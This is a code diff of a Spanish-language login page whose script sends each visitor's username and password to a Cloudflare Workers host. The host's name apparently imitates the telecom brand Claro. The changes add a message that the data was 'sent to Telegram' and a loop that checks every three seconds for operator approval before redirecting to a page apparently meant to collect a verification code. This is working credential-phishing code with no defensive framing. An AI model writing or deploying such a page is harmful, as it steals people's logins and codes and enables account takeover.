@@ -5,36 +5,33 @@
   <title>Login</title>
 </head>
 <body>
-  <div id="loginDiv">
-    <h2>Formulario de Acceso</h2>
-    <form id="loginForm">
-      <label>Usuario:</label>
-      <input type="text" id="usuario" required><br><br>
+  <h2>Formulario de Acceso</h2>
+  <form id="loginForm">
+    <label>Usuario:</label>
+    <input type="text" id="usuario" required><br><br>
 
-      <label>Clave:</label>
-      <input type="password" id="clave" required><br><br>
+    <label>Clave:</label>
+    <input type="password" id="clave" required><br><br>
 
-      <button type="submit">Enviar</button>
-    </form>
-  </div>
+    <button type="submit">Enviar</button>
+  </form>
 
-  <div id="waitingDiv" style="display:none;">
+  <div id="espera" style="display:none;">
     <h2>Ingresando...</h2>
     <p id="status">Esperando autorización...</p>
   </div>
 
   <script>
     const loginForm = document.getElementById("loginForm");
-    const loginDiv = document.getElementById("loginDiv");
-    const waitingDiv = document.getElementById("waitingDiv");
+    const esperaDiv = document.getElementById("espera");
     const statusEl = document.getElementById("status");
 
     loginForm.addEventListener("submit", async (e) => {
       e.preventDefault();
+
       const usuario = document.getElementById("usuario").value;
       const clave = document.getElementById("clave").value;
 
-      // Enviar datos al Worker
       try {
         const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
           method: "POST",
@@ -44,31 +41,33 @@
 
         const data = await res.json();
         if(data.ok){
-          // Ocultar login, mostrar pantalla de espera
-          loginDiv.style.display = "none";
-          waitingDiv.style.display = "block";
+          alert("✅ Enviado a Telegram, esperando autorización...");
+          loginForm.style.display = "none";
+          esperaDiv.style.display = "block";
 
-          // Inicia polling
-          setInterval(async () => {
+          const userId = data.id;
+
+          // Polling cada 3 segundos para verificar autorización
+          const interval = setInterval(async () => {
             try {
-              const statusRes = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/status");
+              const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${userId}`);
               const statusData = await statusRes.json();
               if(statusData.autorizado){
-                window.location.href = "codigo.html"; // redirige cuando autorices
-              } else {
-                statusEl.textContent = "Esperando autorización...";
+                clearInterval(interval);
+                window.location.href = "codigo.html"; // Redirige al código
               }
             } catch(err){
-              statusEl.textContent = "Error al conectar al servidor.";
               console.error(err);
+              statusEl.textContent = "Error al conectar al servidor.";
             }
           }, 3000);
+
         } else {
-          alert("Error al enviar datos: " + data.error);
+          alert("❌ Error: " + data.error);
         }
-      } catch(err) {
-        alert("Error al conectar con el servidor.");
-        console.error(err);
+
+      } catch(err){
+        alert("❌ Error al enviar datos: " + err.message);
       }
     });
   </script>
